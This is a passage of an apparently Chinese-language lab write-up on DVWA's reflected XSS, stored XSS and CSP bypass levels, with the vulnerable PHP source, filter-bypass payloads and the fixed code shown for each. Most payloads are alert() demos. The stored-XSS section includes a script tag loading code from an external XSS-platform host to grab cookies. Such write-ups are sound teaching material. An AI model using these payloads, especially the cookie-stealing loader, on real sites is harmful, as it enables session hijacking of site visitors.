class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><h1 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS(Reflected)"></a>XSS(Reflected)</h1><h2 id="Low-10"><a href="#Low-10" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . $_GET[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接将<code>$_GET[name]</code>拼接到了HTML标签中，于是容易XSS</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>但是反射型XSS，一般无法弹cookie，在配合CSRF时，还有很多的操作空间。</p><h2 id="Medium-10"><a href="#Medium-10" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过<code>str_replace</code>过滤了<code>&lt;script&gt;</code>,但是可以直接通过大小写绕过，双写绕过或使用其他标签。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;scRipt&gt;alert(&#39;XSS&#39;);&lt;&#x2F;Script&gt;</span><br></pre></td></tr></table></figure><h2 id="High-9"><a href="#High-9" class="headerlink" title="High"></a>High</h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $name = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[ <span class="string">&#x27;name&#x27;</span> ] ); </span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，High级别的代码同样使用黑名单过滤输入，preg_replace()函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。</p><p><strong>漏洞利用</strong></p><p>虽然无法使用<code>&lt;script&gt;</code>标签注入XSS代码，但是可以通过<code>img、body</code>等标签的事件或者iframe等标签的src注入恶意的js代码。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="Impossible-9"><a href="#Impossible-9" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = htmlspecialchars( $_GET[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码使用<code>htmlspecialchars</code>函数把预定义的字符<code>&amp;、”、 ’、&lt;、&gt;</code>转换为HTML实体，防止浏览器将其作为HTML元素。</p><h1 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS(Stored)"></a>XSS(Stored)</h1><h2 id="Low-11"><a href="#Low-11" class="headerlink" title="Low"></a>Low</h2><p>明显的存储型XSS。<code>trim</code>去除数据末尾的空白符，<code>stripslashes(string)</code>函数删除字符串中的反斜杠。然后用SQL语句拼接到数据库里存储起来，并且再次访问时，会调用这些数据，写到一个一个div中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;guestbook_comments&quot;&gt;Name: test&lt;br &#x2F;&gt;Message: This is a test comment.&lt;br &#x2F;&gt;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;XSS&#39;);&lt;&#x2F;script&gt;</span><br><span class="line">&lt;sCRiPt&#x2F;SrC&#x3D;&#x2F;&#x2F;xss.pt&#x2F;Lq8N&gt;  &#x2F;&#x2F;再次打开时会调用导致弹Cookie等</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/i8mPtOp7K6kG5sX.png"></p><h2 id="Medium-11"><a href="#Medium-11" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将<code>message</code>中得标签去除，将<code>name</code>的<code>&lt;script&gt;</code>替换成空。<code>name</code>变量更好突破，双写，大小写，换成其他标签都可以。</p><p>下面给出两个payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. name大小写双写绕过,但因为name存在js的长度限制，可以用burp接收</span><br><span class="line">txtName&#x3D;&lt;scRipt&gt;alert(&#39;XSS&#39;);&lt;&#x2F;sCript&gt;&amp;mtxMessage&#x3D;2&amp;btnSign&#x3D;Sign+Guestbook</span><br><span class="line"></span><br><span class="line">2. name替换其他标签</span><br><span class="line">txtName&#x3D;&lt;img src&#x3D;x onerror&#x3D;alert(&#39;XSS&#39;)&gt;&amp;mtxMessage&#x3D;12138</span><br></pre></td></tr></table></figure><h2 id="High-10"><a href="#High-10" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>name也是用了一个正则，把<code>&lt;script&gt;</code>大小写双写都包含了，但是一样可以利用其它标签和事件来触发js。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="Impossible-10"><a href="#Impossible-10" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = stripslashes( $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $name = htmlspecialchars( $name );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:message&#x27;</span>, $message, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:name&#x27;</span>, $name, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，通过使用htmlspecialchars函数，解决了XSS，但是要注意的是，如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。</p><h1 id="CSP-Bypass"><a href="#CSP-Bypass" class="headerlink" title="CSP Bypass"></a>CSP Bypass</h1><h2 id="Low-12"><a href="#Low-12" class="headerlink" title="Low"></a>Low</h2><p>首先，何为CSP？CSP是内容安全策略（Content Security Policy），是一种声明机制，允许Web开发者在其应用程序上指定多个安全限制，由支持的用户代理（浏览器）来负责强制执行。CSP旨在“作为开发人员可以使用的工具，以各种方式保护其应用程序，减轻内容注入漏洞的风险和减少它们的应用程序执行的特权”。</p><p>实际应用中，配置了CSP策略，往往在请求头中出现<code>Content-Security-Policy</code> 和 <code>X-Content-Security-Policy</code> 或者 <code>X-Webkit-CSP</code>（X-*不推荐使用）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;&quot;</span>; <span class="comment">// allows js from self, pastebin.com, jquery and google analytics.</span></span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://pastebin.com/raw/R570EE00</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &lt;script src=&#x27;&quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;&#x27;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure><p><code>script-src &#39;self&#39;</code>是指允许同站的资源调用运行（js等），即这段代码使用了CSP信任了以下网站，这些网站的内容CSP都不会拦截</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本网站的资源</span><br><span class="line">https:&#x2F;&#x2F;pastebin.com  </span><br><span class="line">example.com </span><br><span class="line">code.jquery.com </span><br><span class="line">https:&#x2F;&#x2F;ssl.google-analytics.com</span><br></pre></td></tr></table></figure><p>于是我们可以利用其中一些可控的网站，写一些XSS等危险内容，再通过该网站调用，即利用白名单中的网站可控数据来打XSS。</p><p>发现<code>https://pastebin.com</code>是一个代码编辑网站，可以写代码存到这个网站的服务器，并且上面的代码中直接通过js引用，所以在这个网站中写一段<code>alert(&quot;hahaha&quot;)</code>，将地址提交到dvwa中即可弹窗。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;pastebin.com</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/sDQ3twlSjxmPfqA.png"></p><h2 id="Medium-12"><a href="#Medium-12" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Disable XSS protections so that inline alert boxes will work</span></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>​    <code>unsafe-inline</code>，允许使用内联资源，如内联<code>&lt; script&gt;</code>元素，<code>javascript:URL</code>，内联事件处理程序（如onclick）和内联<code>&lt; style&gt;</code>元素。必须包括单引号。<br>​    <code>nonce-source</code>，仅允许特定的内联脚本块，<code>nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA&quot;</code></p><p>允许通过<code>&lt;script nonce=&quot;***&quot;&gt;</code>,来执行<code>***</code>部分的代码和脚本。</p><p>更多CSP<code>SourceValue</code>，参见<a href="http://cosmos-admin.hgame.day-day.work/">http://cosmos-admin.hgame.day-day.work</a></p></blockquote><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script nonce&#x3D;&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA&#x3D;&quot;&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>使用 ‘unsafe-inline’ 和 ‘unsafe-eval’ 都是不安全的，它们会使您的网站有跨站脚本攻击风险。</p></blockquote><h2 id="High-11"><a href="#High-11" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;The page makes a call to &#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现这个文件本身没什么问题，但是调用了一个<code>jsonp.php</code>，跟进一下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (array_key_exists (<span class="string">&quot;callback&quot;</span>, $_GET)) 